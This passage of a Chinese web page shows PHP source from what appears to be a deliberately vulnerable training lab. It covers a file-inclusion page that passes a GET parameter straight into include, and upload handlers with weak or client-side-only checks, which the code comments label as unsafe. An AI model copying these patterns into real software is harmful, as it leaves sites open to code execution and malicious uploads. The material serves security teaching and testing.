punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token string">"include/$filename"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//变量传进来直接包含,没做任何的安全限制</span>
<span class="token comment" spellcheck="true">//     安全的写法,使用白名单，严格指定包含的文件名</span>
<span class="token comment" spellcheck="true">//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){</span>
<span class="token comment" spellcheck="true">//         include "include/$filename";</span>
<span class="token comment" spellcheck="true">//     }</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>


<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main-content1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main-content-inner1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>page-content1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>fi_main</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fi_title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">PS</span><span class="token punctuation">:</span>这里可以看到一些好看的图片示例哦<span class="token operator">~</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file1.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>the Eiffel Tower<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file2.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>the Great Wall<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file3.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Big Ben<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file4.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Statue Of Liberty<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file5.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Taj Mahal<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>
                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sub<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
                <span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.page-content1 --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.main-content1 --></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>uploadfunction.php</li>
</ul>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//客户端前端验证的后台函数</span>
<span class="token keyword">function</span> <span class="token function">upload_client</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$arr_errors</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token number">1</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值'</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'</span><span class="token punctuation">,</span>
        <span class="token number">3</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件只有部分被上传'</span><span class="token punctuation">,</span>
        <span class="token number">4</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'没有文件被上传'</span><span class="token punctuation">,</span>
        <span class="token number">6</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'找不到临时文件夹'</span><span class="token punctuation">,</span>
        <span class="token number">7</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件写入失败'</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'请选择上传文件！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$arr_errors</span><span class="token punctuation">[</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//新建一个保存文件的目录</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'上传文件保存目录创建失败，请检查权限!'</span><span class="token punctuation">;</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$save_path</span><span class="token operator">=</span><span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给路径加个斜杠</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'临时文件移动失败，请检查权限!'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'new_path'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//只通过MIME类型验证了一下图片类型，其他的无验证,upsafe_upload_check.php</span>
<span class="token keyword">function</span> <span class="token function">upload_sick</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$arr_errors</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token number">1</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值'</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'</span><span class="token punctuation">,</span>
        <span class="token number">3</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件只有部分被上传'</span><span class="token punctuation">,</span>
        <span class="token number">4</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'没有文件被上传'</span><span class="token punctuation">,</span>
        <span class="token number">6</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'找不到临时文件夹'</span><span class="token punctuation">,</span>
        <span class="token number">7</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件写入失败'</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'请选择上传文件！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$arr_errors</span><span class="token punctuation">[</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//验证一下MIME类型</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$mime</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'上传的图片只能是jpg,jpeg,png格式的！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//新建一个保存文件的目录</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'上传文件保存目录创建失败，请检查权限!'</span><span class="token punctuation">;</span>
            <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$save_path</span><span class="token operator">=</span><span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$save_path</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给路径加个斜杠</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'临时文件移动失败，请检查权限!'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//如果以上都通过了，则返回这些值，存储的路径，新的文件名（不要暴露出去）</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'new_path'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$save_path</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//进行了严格的验证</span>
<span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$size</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$arr_errors</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token number">1</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值'</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'</span><span class="token punctuation">,</span>
        <span class="token number">3</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件只有部分被上传'</span><span class="token punctuation">,</span>
        <span class="token number">4</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'没有文件被上传'</span><span class="token punctuation">,</span>
        <span class="token number">6</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'找不到临时文件夹'</span><span class="token punctuation">,</span>
        <span class="token number">7</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'文件写入失败'</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//     var_dump($_FILES);</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'请选择上传文件！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$arr_errors</span><span class="token punctuation">[</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//验证上传方式</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'您上传的文件不是通过 HTTP POST方式上传的！'</span><span class="token punctuation">;</span>
        <span class="token variable">$return_data</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$return_data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//获取后缀名，如果不存在后缀名，则将变量设置为空</span>
    <span class="token variable">$arr_filename</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
